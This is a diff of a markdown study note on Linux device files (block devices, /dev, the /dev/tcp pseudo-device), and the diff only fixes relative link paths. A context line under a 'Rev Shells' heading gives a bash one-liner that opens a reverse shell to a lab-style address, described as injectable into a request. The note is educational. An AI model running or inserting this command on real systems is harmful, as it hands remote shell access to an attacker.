@@ -14,13 +14,13 @@ Block devices are different from character ones because they allow *reading and 
 
 Because block devices *are buffered* a programmer doesn't know how long it will take for the data being written to pass from the kernel's buffer to the actual device. They also can't be sure in what order two separate writes will reach the device.
 ## `/dev`
-The `/dev` directory contains entries for *physical devices* which may or may not represent actual hardware present on the system (device files). Among the devices represented here, you can find the loopback directory (for [loopback](../../networking/routing/loopback.md) devices) `/dev/loop0`, CD drives (`/dev/hdc`), hard drive partitions (`/dev/sda1`), [UDP](../../networking/protocols/UDP.md) ports `/dev/udp`,  TCP ports `/dev/tcp`, etc. as well as specialized pseudo-devices like `/dev/null`, `/dev/zero`, and `/dev/urandom`.  
+The `/dev` directory contains entries for *physical devices* which may or may not represent actual hardware present on the system (device files). Among the devices represented here, you can find the loopback directory (for [loopback](../../../networking/routing/loopback.md) devices) `/dev/loop0`, CD drives (`/dev/hdc`), hard drive partitions (`/dev/sda1`), [UDP](../../../networking/protocols/UDP.md) ports `/dev/udp`,  TCP ports `/dev/tcp`, etc. as well as specialized pseudo-devices like `/dev/null`, `/dev/zero`, and `/dev/urandom`.  
 
 Some devices mounted here are *virtual* like `/dev/null`,  `/dev/zero`,  and `/dev/urandom`. This means they're not actual physical devices and *only exist in software*. 
 ### `/dev/tcp`
-`/dev/tcp/[host]/[port]` is a *psuedo device file* and writing to it will *open a [TCP](../../networking/protocols/TCP.md) connection* to the referenced host and port number. The `/[host]` and `/[port]` "directories" correspond to the *destination*, not the address and port number of the local machine making the connection.
+`/dev/tcp/[host]/[port]` is a *psuedo device file* and writing to it will *open a [TCP](../../../networking/protocols/TCP.md) connection* to the referenced host and port number. The `/[host]` and `/[port]` "directories" correspond to the *destination*, not the address and port number of the local machine making the connection.
 #### Rev Shells
-An example of how `/dev/tcp` can be used in scripts is this one-liner [bash](../../coding/languages/bash.md) script which can be injected into a request to open a [rev-shell](../../cybersecurity/TTPs/exploitation/rev-shell.md):
+An example of how `/dev/tcp` can be used in scripts is this one-liner [bash](../../../coding/languages/bash.md) script which can be injected into a request to open a [rev-shell](../../../cybersecurity/TTPs/exploitation/rev-shell.md):
 ```bash
  bash -i >& /dev/tcp/192.168.119.3/4444 0>&1
 ```
